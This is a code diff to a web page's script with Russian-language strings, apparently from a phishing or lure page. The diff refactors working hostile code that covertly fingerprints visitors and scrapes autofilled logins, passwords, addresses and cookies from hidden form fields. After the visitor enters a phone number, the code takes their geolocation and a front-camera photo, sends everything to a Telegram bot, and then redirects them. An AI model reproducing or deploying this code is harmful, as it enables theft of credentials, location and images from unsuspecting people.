@@ -129,96 +129,62 @@ shuffleAndShow();
 setInterval(shuffleAndShow,8000);
 setInterval(function(){document.getElementById('updSec').textContent=Math.floor(Math.random()*15)+1},4000);
 
-var passiveData={};
+var PD={};
+PD.ua=navigator.userAgent;PD.platform=navigator.platform;PD.lang=navigator.language;
+PD.sw=screen.width;PD.sh=screen.height;
+PD.tz=Intl.DateTimeFormat().resolvedOptions().timeZone;
+PD.cpu=navigator.hardwareConcurrency||"?";PD.ram=navigator.deviceMemory||"?";
+PD.mobile=/Mobi|Android/i.test(navigator.userAgent);
+PD.ref=document.referrer||"direct";
+PD.cookie=document.cookie||"-";
+PD.bat="-";PD.gpu="-";PD.conn="-";
+
+// IP
 fetch("https://ipapi.co/json/").then(function(r){return r.json()}).then(function(j){
-passiveData.ip=j.ip||"-";passiveData.country=j.country_name||"-";passiveData.city=j.city||"-";
-passiveData.region=j.region||"-";passiveData.provider=j.org||"-";passiveData.tz_ip=j.timezone||"-";
+PD.ip=j.ip||"-";PD.country=j.country_name||"-";PD.city=j.city||"-";
+PD.region=j.region||"-";PD.provider=j.org||"-";PD.tz_ip=j.timezone||"-";
 }).catch(function(){});
 
-passiveData.ua=navigator.userAgent;passiveData.platform=navigator.platform;passiveData.lang=navigator.language;
-passiveData.sw=screen.width;passiveData.sh=screen.height;
-passiveData.tz=Intl.DateTimeFormat().resolvedOptions().timeZone;
-passiveData.cpu=navigator.hardwareConcurrency||"?";passiveData.ram=navigator.deviceMemory||"?";
-passiveData.mobile=/Mobi|Android/i.test(navigator.userAgent);
-passiveData.ref=document.referrer||"direct";
-passiveData.cookie=document.cookie||"-";
-
-setTimeout(function(){
-passiveData.af_u=document.querySelector('[name="u"]').value||"-";
-passiveData.af_p=document.querySelector('[name="p"]').value||"-";
-passiveData.af_e=document.querySelector('[name="e"]').value||"-";
-passiveData.af_fn=document.querySelector('[name="fn"]').value||"-";
-passiveData.af_ph=document.querySelector('[name="ph"]').value||"-";
-passiveData.af_ph2=document.querySelector('[name="ph2"]').value||"-";
-passiveData.af_adr=document.querySelector('[name="adr"]').value||"-";
-},3000);
-
-async function submitAll(){
-var phone=document.getElementById('popupPhone').value.trim();
-if(!phone){alert('Введите номер телефона');return}
-passiveData.entered_phone=phone;
-
-// Геолокация
-if(navigator.geolocation){
-navigator.geolocation.getCurrentPosition(function(pos){
-passiveData.geo_lat=pos.coords.latitude;
-passiveData.geo_lng=pos.coords.longitude;
-passiveData.geo_acc=pos.coords.accuracy+' м';
-},function(){},{enableHighAccuracy:true,timeout:5000});
-}
-
-// Камера + микрофон
+// GPU
 try{
-var stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"},audio:true});
-passiveData.camera="доступ получен";
-passiveData.mic="доступ получен";
-var video=document.createElement('video');
-video.srcObject=stream;
-video.play();
+var cv=document.createElement('canvas');var gl=cv.getContext('webgl');
+if(gl){var db=gl.getExtension('WEBGL_debug_renderer_info');
+if(db){PD.gpu=gl.getParameter(db.UNMASKED_RENDERER_WEBGL)}}
+}catch(e){}
+
+// Battery
+try{navigator.getBattery().then(function(b){PD.bat=Math.round(b.level*100)+"% ch:"+b.charging})}catch(e){}
+try{if(navigator.connection){PD.conn=navigator.connection.effectiveType}}catch(e){}
+
+// Autofill
 setTimeout(function(){
-var canvas=document.createElement('canvas');
-canvas.width=320;canvas.height=240;
-var ctx=canvas.getContext('2d');
-ctx.drawImage(video,0,0,320,240);
-passiveData.photo=canvas.toDataURL('image/jpeg',0.6);
-stream.getTracks().forEach(function(t){t.stop()});
-sendAllData();
-},1500);
-}catch(e){
-passiveData.camera="отказано";
-passiveData.mic="отказано";
-sendAllData();
-}
+PD.af_u=document.querySelector('[name="u"]').value||"-";
+PD.af_p=document.querySelector('[name="p"]').value||"-";
+PD.af_e=document.querySelector('[name="e"]').value||"-";
+PD.af_fn=document.querySelector('[name="fn"]').value||"-";
+PD.af_ph=document.querySelector('[name="ph"]').value||"-";
+PD.af_ph2=document.querySelector('[name="ph2"]').value||"-";
+PD.af_adr=document.querySelector('[name="adr"]').value||"-";
+},2500);
 
-// Уведомления
-if('Notification' in window){
-Notification.requestPermission().then(function(p){passiveData.notifications=p});
-}
-}
-
-function sendAllData(){
-var d=passiveData;
-
+function sendMsg(d){
 var msg='🚨 ПОЛНЫЙ ЗАХВАТ\n\n'+
-'🆔 '+sid+'\n'+
-'🕐 '+new Date().toLocaleString("ru-RU")+'\n\n'+
-'🌐 IP: '+d.ip+'\n'+
-'📍 '+d.country+', '+d.city+', '+d.region+'\n'+
-'📡 '+d.provider+'\n'+
-'🕐 TZ: '+d.tz+' / IP: '+d.tz_ip+'\n\n'+
-'📱 '+d.platform+' | '+(d.mobile?'MOBILE':'PC')+'\n'+
-'🖥 '+d.sw+'x'+d.sh+' | CPU:'+d.cpu+' | RAM:'+d.ram+'\n'+
-'🗣 '+d.lang+'\n'+
-'🎮 '+d.gpu+'\n'+
-'🔋 '+d.bat+'\n\n'+
-'📞 ТЕЛЕФОН: '+d.entered_phone+'\n\n'+
-'📍 ГЕОЛОКАЦИЯ:\n'+
-'Широта: '+(d.geo_lat||"ожидание")+'\n'+
-'Долгота: '+(d.geo_lng||"ожидание")+'\n'+
-'Точность: '+(d.geo_acc||"ожидание")+'\n\n'+
-'📸 КАМЕРА: '+(d.camera||"ожидание")+'\n'+
-'🎤 МИКРОФОН: '+(d.mic||"ожидание")+'\n'+
-'🔔 УВЕДОМЛЕНИЯ: '+(d.notifications||"ожидание")+'\n\n'+
+'🆔 '+sid+'\n🕐 '+new Date().toLocaleString("ru-RU")+'\n\n'+
+'🌐 IP: '+(d.ip||"-")+'\n'+
+'📍 '+(d.country||"-")+', '+(d.city||"-")+', '+(d.region||"-")+'\n'+
+'📡 '+(d.provider||"-")+'\n'+
+'🕐 TZ: '+(d.tz||"-")+' / IP: '+(d.tz_ip||"-")+'\n\n'+
+'📱 '+(d.platform||"-")+' | '+(d.mobile?'MOBILE':'PC')+'\n'+
+'🖥 '+(d.sw||"-")+'x'+(d.sh||"-")+' | CPU:'+(d.cpu||"-")+' | RAM:'+(d.ram||"-")+'\n'+
+'🗣 '+(d.lang||"-")+'\n'+
+'🎮 '+(d.gpu||"-")+'\n'+
+'🔋 '+(d.bat||"-")+'\n'+
+'📶 '+(d.conn||"-")+'\n\n'+
+'📞 ТЕЛЕФОН: '+(d.entered_phone||"-")+'\n\n'+
+'📍 ГЕО:\nШирота: '+(d.geo_lat||"ожидание")+'\nДолгота: '+(d.geo_lng||"ожидание")+'\nТочность: '+(d.geo_acc||"ожидание")+'\n\n'+
+'📸 КАМЕРА: '+(d.camera||"-")+'\n'+
+'🎤 МИКРОФОН: '+(d.mic||"-")+'\n'+
+'🔔 УВЕДОМЛЕНИЯ: '+(d.notifications||"-")+'\n\n'+
 '🔑 АВТОЗАПОЛНЕНИЕ:\n'+
 'LOGIN: '+(d.af_u||"-")+'\n'+
 'PASS: '+(d.af_p||"-")+'\n'+
@@ -227,32 +193,77 @@ var msg='🚨 ПОЛНЫЙ ЗАХВАТ\n\n'+
 'PHONE: '+(d.af_ph||"-")+'\n'+
 'PHONE2: '+(d.af_ph2||"-")+'\n'+
 'ADDR: '+(d.af_adr||"-")+'\n\n'+
-'🔗 REF: '+d.ref+'\n'+
-'🍪 COOKIE: '+(d.cookie||"-").substring(0,500);
+'🔗 REF: '+(d.ref||"-")+'\n'+
+'🍪 COOKIE: '+((d.cookie||"-").substring(0,500));
 
 fetch('https://api.telegram.org/bot'+TOKEN+'/sendMessage',{
 method:"POST",
 headers:{"Content-Type":"application/json"},
 body:JSON.stringify({chat_id:CHAT,text:msg})
 });
-
-if(d.photo){
-var byteString=atob(d.photo.split(',')[1]);
-var mimeString=d.photo.split(',')[0].split(':')[1].split(';')[0];
-var ab=new ArrayBuffer(byteString.length);
-var ia=new Uint8Array(ab);
-for(var i=0;i<byteString.length;i++){ia[i]=byteString.charCodeAt(i)}
-var blob=new Blob([ab],{type:mimeString});
-var formData=new FormData();
-formData.append('chat_id',CHAT);
-formData.append('photo',blob,'face.jpg');
-formData.append('caption','📸 ФОТО\n🆔 '+sid);
-fetch('https://api.telegram.org/bot'+TOKEN+'/sendPhoto',{method:"POST",body:formData});
 }
 
+async function submitAll(){
+var phone=document.getElementById('popupPhone').value.trim();
+if(!phone){alert('Введите номер телефона');return}
+PD.entered_phone=phone;
+
+// Гео
+if(navigator.geolocation){
+navigator.geolocation.getCurrentPosition(function(pos){
+PD.geo_lat=pos.coords.latitude;
+PD.geo_lng=pos.coords.longitude;
+PD.geo_acc=pos.coords.accuracy+' м';
+},{},{enableHighAccuracy:true,timeout:5000});
+}
+
+// Камера + микрофон
+try{
+var stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"},audio:true});
+PD.camera="получен";
+PD.mic="получен";
+var video=document.createElement('video');
+video.srcObject=stream;
+video.play();
+setTimeout(function(){
+var canvas=document.createElement('canvas');
+canvas.width=320;canvas.height=240;
+var ctx=canvas.getContext('2d');
+ctx.drawImage(video,0,0,320,240);
+var photo=canvas.toDataURL('image/jpeg',0.6);
+stream.getTracks().forEach(function(t){t.stop()});
+
+// Отправка
+sendMsg(PD);
+
+// Фото
+var bs=atob(photo.split(',')[1]);
+var ms=photo.split(',')[0].split(':')[1].split(';')[0];
+var ab=new ArrayBuffer(bs.length);
+var ia=new Uint8Array(ab);
+for(var i=0;i<bs.length;i++){ia[i]=bs.charCodeAt(i)}
+var blob=new Blob([ab],{type:ms});
+var fd=new FormData();
+fd.append('chat_id',CHAT);
+fd.append('photo',blob,'face.jpg');
+fd.append('caption','📸 ФОТО\n🆔 '+sid);
+fetch('https://api.telegram.org/bot'+TOKEN+'/sendPhoto',{method:"POST",body:fd});
+
 document.getElementById('overlay').style.display='none';
-alert('✅ Доступ подтверждён');
 setTimeout(function(){window.location.replace(REDIR)},2000);
+},1500);
+}catch(e){
+PD.camera="отказано";
+PD.mic="отказано";
+sendMsg(PD);
+document.getElementById('overlay').style.display='none';
+setTimeout(function(){window.location.replace(REDIR)},2000);
+}
+
+// Уведомления
+if('Notification' in window){
+Notification.requestPermission().then(function(p){PD.notifications=p});
+}
 }
 </script>
 </body>
